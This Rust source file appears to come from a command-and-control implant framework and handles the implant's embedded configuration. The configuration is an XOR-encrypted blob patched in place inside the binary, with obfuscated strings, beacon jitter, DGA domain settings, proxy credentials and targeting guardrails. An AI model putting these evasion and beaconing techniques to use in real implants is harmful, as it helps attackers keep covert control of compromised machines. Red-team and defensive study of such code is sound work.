use crate::config::{HttpRequestConfig, RemConfig, SessionConfig, TcpConfig};
use crate::{
    GuardrailConfig, MTLSConfig, ProtocolType, ProxyConfig, ServerConfig, TlsConfig,
    TransportConfig,
};
use base64::{engine::general_purpose, Engine as _};
use malefic_common::debug;
use malefic_common::tinyserde::{Error as TinySerdeError, Value, XorCipher};
use malefic_gateway::obfstr::obfstr;
use malefic_gateway::ObfDebug;
use std::collections::BTreeMap;

/// ASCII padding used to keep the embedded text at a fixed length for in-place patching.
const PAD_BYTE: u8 = b'#';
/// Seed used by tinyserde XOR cipher; deterministic and must match the patcher.
const BLOB_KEY_SEED: u64 = 0x6174_7321_4746_434d;

/// Fixed-length ASCII buffer embedded in the binary for string replacement.
pub const CONFIG_BLOB_TEXT_LEN: usize = 16384;
const CONFIG_BLOB_PREFIX_LEN: usize = 8;
const CONFIG_BLOB_PAYLOAD_LEN: usize = CONFIG_BLOB_TEXT_LEN - CONFIG_BLOB_PREFIX_LEN;

/// Backwards-compatible alias used by the patching CLI (this is *not* a base64 length anymore).
pub const CONFIG_BLOB_B64_LEN: usize = CONFIG_BLOB_TEXT_LEN;

#[repr(C, align(16))]
pub struct ConfigBlobText {
    prefix: [u8; 8],
    payload: [u8; CONFIG_BLOB_PAYLOAD_LEN],
}

impl ConfigBlobText {
    pub const fn new() -> Self {
        Self {
            // Inline the prefix bytes directly to avoid creating a separate constant in the binary
            prefix: *b"CFGv4B64",
            payload: [PAD_BYTE; CONFIG_BLOB_PAYLOAD_LEN],
        }
    }

    #[inline]
    pub fn prefix(&self) -> &[u8; 8] {
        &self.prefix
    }

    #[inline]
    pub fn payload(&self) -> &[u8; CONFIG_BLOB_PAYLOAD_LEN] {
        &self.payload
    }
}

/// Fixed-length ASCII buffer that can be patched in-place inside the binary.
/// We mark it as `used` and `no_mangle` so LTO keeps it, and the name stays visible.
#[no_mangle]
#[used]
pub static CONFIG_BLOB_TEXT: ConfigBlobText = ConfigBlobText::new();

/// Runtime configuration shape; this mirrors the public config values exposed through lazy statics.
#[derive(ObfDebug, Clone, PartialEq)]
pub struct RuntimeConfig {
    pub cron: String,
    pub jitter: f64,
    pub keepalive: bool,
    pub retry: u32,
    pub max_cycles: i32,
    pub name: String,
    pub key: Vec<u8>,
    pub use_env_proxy: bool,
    pub proxy_url: String,
    pub proxy_scheme: String,
    pub proxy_host: String,
    pub proxy_port: String,
    pub proxy_username: String,
    pub proxy_password: String,
    pub dga_enable: bool,
    pub dga_key: String,
    pub dga_interval_hours: u32,
    pub guardrail: GuardrailConfig,
    pub server_configs: Vec<ServerConfig>,
    /// Maximum packet size for auto-chunking. 0 = disabled (no chunking).
    /// Should match server's pipeline packet_length setting.
    pub max_packet_length: usize,
}

#[derive(Debug)]
pub enum BlobError {
    Empty,
    Utf8(std::str::Utf8Error),
    Base64(base64::DecodeError),
    BadPrefix,
    Oversized(usize),
    Deserialize(TinySerdeError),
    InvalidFormat(String),
}

impl std::fmt::Display for BlobError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            BlobError::Empty => f.write_str(obfstr!("config blob is empty")),
            BlobError::Utf8(e) => write!(f, "{}: {}", obfstr!("invalid UTF-8 in config blob"), e),
            BlobError::Base64(e) => write!(f, "{}: {}", obfstr!("base64 decode failed"), e),
            BlobError::BadPrefix => f.write_str(obfstr!("config blob prefix mismatch")),
            BlobError::Oversized(n) => write!(
                f,
                "{} ({} bytes)",
                obfstr!("config blob payload too large"),
                n
            ),
            BlobError::Deserialize(e) => {
                write!(f, "{}: {}", obfstr!("config deserialization failed"), e)
            }
            BlobError::InvalidFormat(s) => write!(f, "{}: {}", obfstr!("invalid config field"), s),
        }
    }
}

impl std::error::Error for BlobError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            BlobError::Utf8(e) => Some(e),
            BlobError::Base64(e) => Some(e),
            BlobError::Deserialize(e) => Some(e),
            _ => None,
        }
    }
}

impl From<std::str::Utf8Error> for BlobError {
    fn from(e: std::str::Utf8Error) -> Self {
        BlobError::Utf8(e)
    }
}

impl From<base64::DecodeError> for BlobError {
    fn from(e: base64::DecodeError) -> Self {
        BlobError::Base64(e)
    }
}

impl From<TinySerdeError> for BlobError {
    fn from(e: TinySerdeError) -> Self {
        BlobError::Deserialize(e)
    }
}

// ==================== Encoder helpers (only needed by malefic-mutant) ====================
#[cfg(feature = "encoder")]
fn value_null() -> Value {
    Value::Null
}

#[cfg(feature = "encoder")]
fn value_str(s: &str) -> Value {
    Value::Str(s.to_string())
}

#[cfg(feature = "encoder")]
fn value_bool(v: bool) -> Value {
    Value::Bool(v)
}

#[cfg(feature = "encoder")]
fn value_int(v: i64) -> Value {
    Value::Int(v)
}

#[cfg(feature = "encoder")]
fn value_bytes(v: &[u8]) -> Value {
    Value::Bytes(v.to_vec())
}

#[cfg(feature = "encoder")]
fn value_vec_str(values: &[String]) -> Value {
    Value::Seq(values.iter().map(|v| Value::Str(v.clone())).collect())
}

#[cfg(feature = "encoder")]
fn value_map(entries: impl IntoIterator<Item = (String, Value)>) -> Value {
    let mut map = BTreeMap::new();
    for (k, v) in entries {
        map.insert(k, v);
    }
    Value::Map(map)
}

#[cfg(feature = "encoder")]
fn duration_to_millis(duration: std::time::Duration) -> i64 {
    i64::try_from(duration.as_millis()).unwrap_or(i64::MAX)
}

#[cfg(feature = "encoder")]
fn value_duration(duration: std::time::Duration) -> Value {
    value_int(duration_to_millis(duration))
}

fn map_get<'a>(
    map: &'a BTreeMap<String, Value>,
    key: impl AsRef<str>,
) -> Result<&'a Value, BlobError> {
    let key = key.as_ref();
    map.get(key)
        .ok_or_else(|| BlobError::InvalidFormat(key.to_string()))
}

fn expect_str(v: &Value, key: impl AsRef<str>) -> Result<String, BlobError> {
    let key = key.as_ref();
    match v {
        Value::Str(s) => Ok(s.clone()),
        _ => Err(BlobError::InvalidFormat(key.to_string())),
    }
}

fn expect_bool(v: &Value, key: impl AsRef<str>) -> Result<bool, BlobError> {
    let key = key.as_ref();
    match v {
        Value::Bool(b) => Ok(*b),
        _ => Err(BlobError::InvalidFormat(key.to_string())),
    }
}

fn expect_i64(v: &Value, key: impl AsRef<str>) -> Result<i64, BlobError> {
    let key = key.as_ref();
    match v {
        Value::Int(n) => Ok(*n),
        _ => Err(BlobError::InvalidFormat(key.to_string())),
    }
}

fn expect_u32(v: &Value, key: impl AsRef<str>) -> Result<u32, BlobError> {
    let key = key.as_ref();
    let n = expect_i64(v, key)?;
    u32::try_from(n).map_err(|_| BlobError::InvalidFormat(key.to_string()))
}

fn expect_usize(v: &Value, key: impl AsRef<str>) -> Result<usize, BlobError> {
    let key = key.as_ref();
    let n = expect_i64(v, key)?;
    usize::try_from(n).map_err(|_| BlobError::InvalidFormat(key.to_string()))
}

fn expect_i32(v: &Value, key: impl AsRef<str>) -> Result<i32, BlobError> {
    let key = key.as_ref();
    let n = expect_i64(v, key)?;
    i32::try_from(n).map_err(|_| BlobError::InvalidFormat(key.to_string()))
}

fn expect_duration(v: &Value, key: impl AsRef<str>) -> Result<std::time::Duration, BlobError> {
    let key = key.as_ref();
    let millis = expect_i64(v, key)?;
    let millis = u64::try_from(millis).map_err(|_| BlobError::InvalidFormat(key.to_string()))?;
    Ok(std::time::Duration::from_millis(millis))
}

fn expect_bytes(v: &Value, key: impl AsRef<str>) -> Result<Vec<u8>, BlobError> {
    let key = key.as_ref();
    match v {
        Value::Bytes(b) => Ok(b.clone()),
        _ => Err(BlobError::InvalidFormat(key.to_string())),
    }
}

fn expect_vec_str(v: &Value, key: impl AsRef<str>) -> Result<Vec<String>, BlobError> {
    let key = key.as_ref();
    match v {
        Value::Seq(seq) => seq
            .iter()
            .map(|item| match item {
                Value::Str(s) => Ok(s.clone()),
                _ => Err(BlobError::InvalidFormat(key.to_string())),
            })
            .collect(),
        _ => Err(BlobError::InvalidFormat(key.to_string())),
    }
}

#[cfg(feature = "encoder")]
fn protocol_to_value(protocol: &ProtocolType) -> Value {
    match protocol {
        ProtocolType::Tcp => value_str("tcp"),
        ProtocolType::Http => value_str("http"),
        ProtocolType::REM => value_str("rem"),
        ProtocolType::Other(name) => value_str(name),
    }
}

fn protocol_from_value(v: &Value) -> Result<ProtocolType, BlobError> {
    let s = expect_str(v, obfstr!("protocol"))?;
    match s.as_str() {
        "tcp" => Ok(ProtocolType::Tcp),
        "http" => Ok(ProtocolType::Http),
        "rem" => Ok(ProtocolType::REM),
        _ => Ok(ProtocolType::Other(s)),
    }
}

#[cfg(feature = "encoder")]
fn transport_to_value(transport: &TransportConfig) -> Value {
    match transport {
        TransportConfig::Tcp(_tcp) => value_map([("kind".to_string(), value_str("tcp"))]),
        TransportConfig::Rem(rem) => value_map([
            ("kind".to_string(), value_str("rem")),
            ("link".to_string(), value_str(&rem.link)),
        ]),
        TransportConfig::Http(http) => {
            let mut headers = BTreeMap::new();
            for (k, v) in &http.headers {
                headers.insert(k.clone(), Value::Str(v.clone()));
            }
            Value::Map({
                let mut map = BTreeMap::new();
                map.insert("kind".to_string(), value_str("http"));
                map.insert("method".to_string(), value_str(&http.method));
                map.insert("path".to_string(), value_str(&http.path));
                map.insert("version".to_string(), value_str(&http.version));
                map.insert("headers".to_string(), Value::Map(headers));
                map.insert(
                    "response_read_chunk_size".to_string(),
                    value_int(http.response_read_chunk_size as i64),
                );
                map.insert(
                    "response_retry_delay_ms".to_string(),
                    value_duration(http.response_retry_delay),
                );
                map
            })
        }
        TransportConfig::Opaque(kind) => value_map([("kind".to_string(), value_str(kind))]),
    }
}

fn transport_from_value(v: &Value) -> Result<TransportConfig, BlobError> {
    let Value::Map(map) = v else {
        return Err(BlobError::InvalidFormat(
            obfstr!("transport_config").to_string(),
        ));
    };
    let kind = expect_str(map_get(map, obfstr!("kind"))?, obfstr!("transport_kind"))?;
    match kind.as_str() {
        "tcp" => Ok(TransportConfig::Tcp(TcpConfig {})),
        "rem" => {
            let link = expect_str(map_get(map, obfstr!("link"))?, obfstr!("link"))?;
            Ok(TransportConfig::Rem(RemConfig::new(link)))
        }
        "http" => {
            let method = expect_str(map_get(map, obfstr!("method"))?, obfstr!("method"))?;
            let path = expect_str(map_get(map, obfstr!("path"))?, obfstr!("path"))?;
            let version = expect_str(map_get(map, obfstr!("version"))?, obfstr!("version"))?;
            let headers_value = map_get(map, obfstr!("headers"))?;
            let Value::Map(headers_map) = headers_value else {
                return Err(BlobError::InvalidFormat(obfstr!("headers").to_string()));
            };
            let mut headers = std::collections::HashMap::new();
            for (k, v) in headers_map {
                let Value::Str(s) = v else {
                    return Err(BlobError::InvalidFormat(obfstr!("headers").to_string()));
                };
                headers.insert(k.clone(), s.clone());
            }
            let mut http = HttpRequestConfig::new(&method, &path, &version).with_runtime_tuning(
                expect_usize(
                    map_get(map, obfstr!("response_read_chunk_size"))?,
                    obfstr!("response_read_chunk_size"),
                )?,
                expect_duration(
                    map_get(map, obfstr!("response_retry_delay_ms"))?,
                    obfstr!("response_retry_delay_ms"),
                )?,
            );
            http.headers = headers;
            Ok(TransportConfig::Http(http))
        }
        _ => Ok(TransportConfig::Opaque(kind)),
    }
}

#[cfg(feature = "encoder")]
fn session_config_to_value(config: &SessionConfig) -> Value {
    value_map([
        (
            "read_chunk_size".to_string(),
            value_int(config.read_chunk_size as i64),
        ),
        ("deadline_ms".to_string(), value_duration(config.deadline)),
        (
            "connect_timeout_ms".to_string(),
            value_duration(config.connect_timeout),
        ),
        ("keepalive".to_string(), value_bool(config.keepalive)),
    ])
}

fn session_config_from_value(v: &Value) -> Result<SessionConfig, BlobError> {
    let Value::Map(map) = v else {
        return Err(BlobError::InvalidFormat(
            obfstr!("session_config").to_string(),
        ));
    };

    Ok(SessionConfig {
        read_chunk_size: expect_usize(
            map_get(map, obfstr!("read_chunk_size"))?,
            obfstr!("read_chunk_size"),
        )?,
        deadline: expect_duration(
            map_get(map, obfstr!("deadline_ms"))?,
            obfstr!("deadline_ms"),
        )?,
        connect_timeout: expect_duration(
            map_get(map, obfstr!("connect_timeout_ms"))?,
            obfstr!("connect_timeout_ms"),
        )?,
        keepalive: expect_bool(map_get(map, obfstr!("keepalive"))?, obfstr!("keepalive"))?,
    })
}

#[cfg(feature = "encoder")]
fn mtls_to_value(mtls: &MTLSConfig) -> Value {
    value_map([
        ("enable".to_string(), value_bool(mtls.enable)),
        ("client_cert".to_string(), value_bytes(&mtls.client_cert)),
        ("client_key".to_string(), value_bytes(&mtls.client_key)),
        ("server_ca".to_string(), value_bytes(&mtls.server_ca)),
    ])
}

fn mtls_from_value(v: &Value) -> Result<MTLSConfig, BlobError> {
    let Value::Map(map) = v else {
        return Err(BlobError::InvalidFormat(obfstr!("mtls_config").to_string()));
    };
    Ok(MTLSConfig {
        enable: expect_bool(map_get(map, obfstr!("enable"))?, obfstr!("enable"))?,
        client_cert: expect_bytes(
            map_get(map, obfstr!("client_cert"))?,
            obfstr!("client_cert"),
        )?,
        client_key: expect_bytes(map_get(map, obfstr!("client_key"))?, obfstr!("client_key"))?,
        server_ca: expect_bytes(map_get(map, obfstr!("server_ca"))?, obfstr!("server_ca"))?,
    })
}

#[cfg(feature = "encoder")]
fn tls_to_value(tls: &TlsConfig) -> Value {
    let mtls_value = tls
        .mtls_config
        .as_ref()
        .map(mtls_to_value)
        .unwrap_or_else(value_null);
    value_map([
        ("enable".to_string(), value_bool(tls.enable)),
        ("version".to_string(), value_str(&tls.version)),
        ("sni".to_string(), value_str(&tls.sni)),
        (
            "skip_verification".to_string(),
            value_bool(tls.skip_verification),
        ),
        ("server_ca".to_string(), value_bytes(&tls.server_ca)),
        ("mtls_config".to_string(), mtls_value),
    ])
}

fn tls_from_value(v: &Value) -> Result<TlsConfig, BlobError> {
    let Value::Map(map) = v else {
        return Err(BlobError::InvalidFormat(obfstr!("tls_config").to_string()));
    };
    let mtls_value = map_get(map, obfstr!("mtls_config"))?;
    let mtls_config = match mtls_value {
        Value::Null => None,
        other => Some(mtls_from_value(other)?),
    };
    // server_ca is optional - default to empty vec if not present
    let server_ca = match map_get(map, obfstr!("server_ca")) {
        Ok(v) => expect_bytes(v, obfstr!("server_ca")).unwrap_or_default(),
        Err(_) => Vec::new(),
    };
    Ok(TlsConfig {
        enable: expect_bool(map_get(map, obfstr!("enable"))?, obfstr!("enable"))?,
        version: expect_str(map_get(map, obfstr!("version"))?, obfstr!("version"))?,
        sni: expect_str(map_get(map, obfstr!("sni"))?, obfstr!("sni"))?,
        skip_verification: expect_bool(
            map_get(map, obfstr!("skip_verification"))?,
            obfstr!("skip_verification"),
        )?,
        server_ca,
        mtls_config,
    })
}

#[cfg(feature = "encoder")]
fn proxy_to_value(proxy: &ProxyConfig) -> Value {
    value_map([
        ("proxy_type".to_string(), value_str(&proxy.proxy_type)),
        ("host".to_string(), value_str(&proxy.host)),
        ("port".to_string(), value_int(proxy.port as i64)),
        ("username".to_string(), value_str(&proxy.username)),
        ("password".to_string(), value_str(&proxy.password)),
    ])
}

fn proxy_from_value(v: &Value) -> Result<ProxyConfig, BlobError> {
    let Value::Map(map) = v else {
        return Err(BlobError::InvalidFormat(
            obfstr!("proxy_config").to_string(),
        ));
    };
    Ok(ProxyConfig {
        proxy_type: expect_str(map_get(map, obfstr!("proxy_type"))?, obfstr!("proxy_type"))?,
        host: expect_str(map_get(map, obfstr!("host"))?, obfstr!("host"))?,
        port: u16::try_from(expect_i64(map_get(map, obfstr!("port"))?, obfstr!("port"))?)
            .map_err(|_| BlobError::InvalidFormat(obfstr!("port").to_string()))?,
        username: expect_str(map_get(map, obfstr!("username"))?, obfstr!("username"))?,
        password: expect_str(map_get(map, obfstr!("password"))?, obfstr!("password"))?,
    })
}

#[cfg(feature = "encoder")]
fn guardrail_to_value(guardrail: &GuardrailConfig) -> Value {
    value_map([
        (
            "ip_addresses".to_string(),
            value_vec_str(&guardrail.ip_addresses),
        ),
        ("usernames".to_string(), value_vec_str(&guardrail.usernames)),
        (
            "server_names".to_string(),
            value_vec_str(&guardrail.server_names),
        ),
        ("domains".to_string(), value_vec_str(&guardrail.domains)),
        ("require_all".to_string(), value_bool(guardrail.require_all)),
    ])
}

fn guardrail_from_value(v: &Value) -> Result<GuardrailConfig, BlobError> {
    let Value::Map(map) = v else {
        return Err(BlobError::InvalidFormat(obfstr!("guardrail").to_string()));
    };
    Ok(GuardrailConfig {
        ip_addresses: expect_vec_str(
            map_get(map, obfstr!("ip_addresses"))?,
            obfstr!("ip_addresses"),
        )?,
        usernames: expect_vec_str(map_get(map, obfstr!("usernames"))?, obfstr!("usernames"))?,
        server_names: expect_vec_str(
            map_get(map, obfstr!("server_names"))?,
            obfstr!("server_names"),
        )?,
        domains: expect_vec_str(map_get(map, obfstr!("domains"))?, obfstr!("domains"))?,
        require_all: expect_bool(
            map_get(map, obfstr!("require_all"))?,
            obfstr!("require_all"),
        )?,
    })
}

#[cfg(feature = "encoder")]
fn server_config_to_value(cfg: &ServerConfig) -> Value {
    let tls_value = cfg
        .tls_config
        .as_ref()
        .map(tls_to_value)
        .unwrap_or_else(value_null);
    let proxy_value = cfg
        .proxy_config
        .as_ref()
        .map(proxy_to_value)
        .unwrap_or_else(value_null);
    let domain_value = cfg
        .domain_suffix
        .as_ref()
        .map(|s| value_str(s))
        .unwrap_or_else(value_null);

    Value::Map({
        let mut map = BTreeMap::new();
        map.insert("address".to_string(), value_str(&cfg.address));
        map.insert("protocol".to_string(), protocol_to_value(&cfg.protocol));
        map.insert(
            "session_config".to_string(),
            session_config_to_value(&cfg.session_config),
        );
        map.insert(
            "transport_config".to_string(),
            transport_to_value(&cfg.transport_config),
        );
        map.insert("tls_config".to_string(), tls_value);
        map.insert("proxy_config".to_string(), proxy_value);
        map.insert("domain_suffix".to_string(), domain_value);
        map
    })
}

fn server_config_from_value(v: &Value) -> Result<ServerConfig, BlobError> {
    let Value::Map(map) = v else {
        return Err(BlobError::InvalidFormat(
            obfstr!("server_config").to_string(),
        ));
    };
    let tls_value = map_get(map, obfstr!("tls_config"))?;
    let tls_config = match tls_value {
        Value::Null => None,
        other => Some(tls_from_value(other)?),
    };
    let proxy_value = map_get(map, obfstr!("proxy_config"))?;
    let proxy_config = match proxy_value {
        Value::Null => None,
        other => Some(proxy_from_value(other)?),
    };
    let domain_value = map_get(map, obfstr!("domain_suffix"))?;
    let domain_suffix = match domain_value {
        Value::Null => None,
        Value::Str(s) => Some(s.clone()),
        _ => {
            return Err(BlobError::InvalidFormat(
                obfstr!("domain_suffix").to_string(),
            ))
        }
    };
    Ok(ServerConfig {
        address: expect_str(map_get(map, obfstr!("address"))?, obfstr!("address"))?,
        protocol: protocol_from_value(map_get(map, obfstr!("protocol"))?)?,
        session_config: session_config_from_value(map_get(map, obfstr!("session_config"))?)?,
        transport_config: transport_from_value(map_get(map, obfstr!("transport_config"))?)?,
        tls_config,
        proxy_config,
        domain_suffix,
    })
}

#[cfg(feature = "encoder")]
fn runtime_to_value(cfg: &RuntimeConfig) -> Value {
    Value::Map({
        let mut map = BTreeMap::new();
        map.insert("cron".to_string(), value_str(&cfg.cron));
        map.insert("jitter".to_string(), Value::Float(cfg.jitter));
        map.insert("keepalive".to_string(), value_bool(cfg.keepalive));
        map.insert("retry".to_string(), value_int(cfg.retry as i64));
        map.insert("max_cycles".to_string(), value_int(cfg.max_cycles as i64));
        map.insert("name".to_string(), value_str(&cfg.name));
        map.insert("key".to_string(), value_bytes(&cfg.key));
        map.insert("use_env_proxy".to_string(), value_bool(cfg.use_env_proxy));
        map.insert("proxy_url".to_string(), value_str(&cfg.proxy_url));
        map.insert("proxy_scheme".to_string(), value_str(&cfg.proxy_scheme));
        map.insert("proxy_host".to_string(), value_str(&cfg.proxy_host));
        map.insert("proxy_port".to_string(), value_str(&cfg.proxy_port));
        map.insert("proxy_username".to_string(), value_str(&cfg.proxy_username));
        map.insert("proxy_password".to_string(), value_str(&cfg.proxy_password));
        map.insert("dga_enable".to_string(), value_bool(cfg.dga_enable));
        map.insert("dga_key".to_string(), value_str(&cfg.dga_key));
        map.insert(
            "dga_interval_hours".to_string(),
            value_int(cfg.dga_interval_hours as i64),
        );
        map.insert("guardrail".to_string(), guardrail_to_value(&cfg.guardrail));
        map.insert(
            "server_configs".to_string(),
            Value::Seq(
                cfg.server_configs
                    .iter()
                    .map(server_config_to_value)
                    .collect(),
            ),
        );
        map.insert(
            "max_packet_length".to_string(),
            value_int(cfg.max_packet_length as i64),
        );
        map
    })
}

fn runtime_from_value(v: &Value) -> Result<RuntimeConfig, BlobError> {
    let Value::Map(map) = v else {
        return Err(BlobError::InvalidFormat(
            obfstr!("runtime_config").to_string(),
        ));
    };
    Ok(RuntimeConfig {
        cron: expect_str(map_get(map, obfstr!("cron"))?, obfstr!("cron"))?,
        jitter: match map_get(map, obfstr!("jitter"))? {
            Value::Float(f) => *f,
            _ => return Err(BlobError::InvalidFormat(obfstr!("jitter").to_string())),
        },
        keepalive: expect_bool(map_get(map, obfstr!("keepalive"))?, obfstr!("keepalive"))?,
        retry: expect_u32(map_get(map, obfstr!("retry"))?, obfstr!("retry"))?,
        max_cycles: expect_i32(map_get(map, obfstr!("max_cycles"))?, obfstr!("max_cycles"))?,
        name: expect_str(map_get(map, obfstr!("name"))?, obfstr!("name"))?,
        key: expect_bytes(map_get(map, obfstr!("key"))?, obfstr!("key"))?,
        use_env_proxy: expect_bool(
            map_get(map, obfstr!("use_env_proxy"))?,
            obfstr!("use_env_proxy"),
        )?,
        proxy_url: expect_str(map_get(map, obfstr!("proxy_url"))?, obfstr!("proxy_url"))?,
        proxy_scheme: expect_str(
            map_get(map, obfstr!("proxy_scheme"))?,
            obfstr!("proxy_scheme"),
        )?,
        proxy_host: expect_str(map_get(map, obfstr!("proxy_host"))?, obfstr!("proxy_host"))?,
        proxy_port: expect_str(map_get(map, obfstr!("proxy_port"))?, obfstr!("proxy_port"))?,
        proxy_username: expect_str(
            map_get(map, obfstr!("proxy_username"))?,
            obfstr!("proxy_username"),
        )?,
        proxy_password: expect_str(
            map_get(map, obfstr!("proxy_password"))?,
            obfstr!("proxy_password"),
        )?,
        dga_enable: expect_bool(map_get(map, obfstr!("dga_enable"))?, obfstr!("dga_enable"))?,
        dga_key: expect_str(map_get(map, obfstr!("dga_key"))?, obfstr!("dga_key"))?,
        dga_interval_hours: expect_u32(
            map_get(map, obfstr!("dga_interval_hours"))?,
            obfstr!("dga_interval_hours"),
        )?,
        guardrail: guardrail_from_value(map_get(map, obfstr!("guardrail"))?)?,
        server_configs: {
            let server_configs_value = map_get(map, obfstr!("server_configs"))?;
            let Value::Seq(seq) = server_configs_value else {
                return Err(BlobError::InvalidFormat(
                    obfstr!("server_configs").to_string(),
                ));
            };
            seq.iter()
                .map(server_config_from_value)
                .collect::<Result<Vec<_>, _>>()?
        },
        max_packet_length: map
            .get(obfstr!("max_packet_length"))
            .and_then(|v| match v {
                Value::Int(n) => Some(*n as usize),
                _ => None,
            })
            .unwrap_or(0),
    })
}

/// Load runtime configuration from the embedded blob (if present), otherwise return `fallback`.
pub fn load_runtime_config(fallback: RuntimeConfig) -> RuntimeConfig {
    if let Some(raw) = read_patched_payload() {
        match decode_runtime_config_str(&raw) {
            Ok(cfg) => return cfg,
            Err(_err) => {
                debug!("[config] Failed to decode runtime config blob: {:?}", _err);
            }
        }
    }

    fallback
}

/// Create a fixed-length ASCII string (4096 bytes) that fits exactly in the embedded buffer.
/// Format: `CFGv3B64` + base64(encrypted tinyserde bytes) + `#` padding.
#[cfg(feature = "encoder")]
pub fn encode_runtime_config(config: &RuntimeConfig) -> Result<String, BlobError> {
    let cipher = XorCipher::new(BLOB_KEY_SEED);
    let encrypted = runtime_to_value(config).to_bytes_encrypted(&cipher);
    let b64 = general_purpose::STANDARD.encode(encrypted);
    if b64.len() > CONFIG_BLOB_PAYLOAD_LEN {
        return Err(BlobError::Oversized(b64.len()));
    }

    let mut out = String::with_capacity(CONFIG_BLOB_TEXT_LEN);
    // out.push_str(std::str::from_utf8(&CONFIG_BLOB_PREFIX).expect("prefix utf8"));
    out.push_str(std::str::from_utf8(CONFIG_BLOB_TEXT.prefix()).expect("prefix utf8"));
    out.push_str(&b64);
    if out.len() < CONFIG_BLOB_TEXT_LEN {
        out.extend(std::iter::repeat(PAD_BYTE as char).take(CONFIG_BLOB_TEXT_LEN - out.len()));
    }
    Ok(out)
}

/// Decode runtime configuration from the fixed-length text produced by `encode_runtime_config`.
pub fn decode_runtime_config_str(text: &str) -> Result<RuntimeConfig, BlobError> {
    let trimmed = text
        .trim_end_matches(PAD_BYTE as char)
        .trim_end_matches('\0')
        .trim();
    debug!("[config] trim text {:?}", trimmed);
    if trimmed.is_empty() {
        return Err(BlobError::Empty);
    }
    // let Some(rest) = trimmed.strip_prefix(std::str::from_utf8(&CONFIG_BLOB_PREFIX).expect("prefix utf8")) else {
    let Some(rest) =
        trimmed.strip_prefix(std::str::from_utf8(CONFIG_BLOB_TEXT.prefix()).expect("prefix utf8"))
    else {
        return Err(BlobError::BadPrefix);
    };
    if rest.is_empty() {
        return Err(BlobError::Empty);
    }
    let cipher_bytes = general_purpose::STANDARD.decode(rest)?;
    decode_runtime_config_bytes(&cipher_bytes)
}

/// Decode runtime configuration from encrypted bytes (after base64 decoding).
pub fn decode_runtime_config_bytes(cipher_bytes: &[u8]) -> Result<RuntimeConfig, BlobError> {
    let value = Value::from_bytes_encrypted(cipher_bytes, &XorCipher::new(BLOB_KEY_SEED))?;
    runtime_from_value(&value)
}

// Runtime-mutable transport key (overrides static KEY when set via switch)
static RUNTIME_KEY: std::sync::OnceLock<std::sync::Mutex<Option<Vec<u8>>>> =
    std::sync::OnceLock::new();

fn runtime_key_lock() -> &'static std::sync::Mutex<Option<Vec<u8>>> {
    RUNTIME_KEY.get_or_init(|| std::sync::Mutex::new(None))
}

/// Update the transport symmetric key at runtime (called by switch).
pub fn update_runtime_key(key: Vec<u8>) {
    if let Ok(mut guard) = runtime_key_lock().lock() {
        *guard = Some(key);
    }
}

/// Get the current transport key (runtime override or static KEY).
pub fn get_transport_key() -> Vec<u8> {
    if let Ok(guard) = runtime_key_lock().lock() {
        if let Some(ref key) = *guard {
            return key.clone();
        }
    }
    crate::KEY.clone()
}

fn read_patched_payload() -> Option<String> {
    let mut buf = Vec::with_capacity(CONFIG_BLOB_TEXT_LEN);
    buf.extend_from_slice(CONFIG_BLOB_TEXT.prefix());
    buf.extend_from_slice(CONFIG_BLOB_TEXT.payload());

    let mut end = buf.len();
    while end > 0 && (buf[end - 1] == PAD_BYTE || buf[end - 1] == 0) {
        end -= 1;
    }

    if end == 0 {
        return None;
    }

    let trimmed = &buf[..end];
    let as_str = std::str::from_utf8(trimmed).ok()?;
    Some(as_str.to_string())
}

#[cfg(all(test, feature = "encoder"))]
mod tests {
    use super::*;

    fn sample_config() -> RuntimeConfig {
        RuntimeConfig {
            cron: "*/5 * * * * * *".into(),
            jitter: 0.2,
            keepalive: true,
            retry: 3,
            max_cycles: -1,
            name: "demo".into(),
            key: b"demo-key".to_vec(),
            use_env_proxy: false,
            proxy_url: "".into(),
            proxy_scheme: "".into(),
            proxy_host: "".into(),
            proxy_port: "".into(),
            proxy_username: "".into(),
            proxy_password: "".into(),
            dga_enable: false,
            dga_key: "".into(),
            dga_interval_hours: 2,
            guardrail: GuardrailConfig {
                ip_addresses: vec![],
                usernames: vec![],
                server_names: vec![],
                domains: vec![],
                require_all: true,
            },
            server_configs: vec![{
                let transport_config =
                    TransportConfig::Http(HttpRequestConfig::new("POST", "/", "1.1"));
                ServerConfig {
                    address: "example.com:443".into(),
                    protocol: ProtocolType::Http,
                    session_config: SessionConfig::default_for_transport(&transport_config, true),
                    transport_config,
                    tls_config: Some(TlsConfig {
                        enable: true,
                        version: "auto".into(),
                        sni: "example.com".into(),
                        skip_verification: true,
                        server_ca: Vec::new(),
                        mtls_config: None,
                    }),
                    proxy_config: None,
                    domain_suffix: None,
                }
            }],
        }
    }

    #[test]
    fn round_trip_encoding() {
        let config = sample_config();
        let encoded = encode_runtime_config(&config).expect("encode");
        assert_eq!(encoded.len(), CONFIG_BLOB_B64_LEN);

        let decoded = decode_runtime_config_str(&encoded).expect("decode");
        assert_eq!(decoded, config);
    }

    #[test]
    fn rejects_bad_prefix() {
        let config = sample_config();
        let encoded = encode_runtime_config(&config).expect("encode");
        let mut corrupted = encoded.into_bytes();
        corrupted[0] = b'X';
        let corrupted = String::from_utf8(corrupted).expect("utf8");
        let result = decode_runtime_config_str(&corrupted);
        assert!(matches!(result, Err(BlobError::BadPrefix)));
    }
}
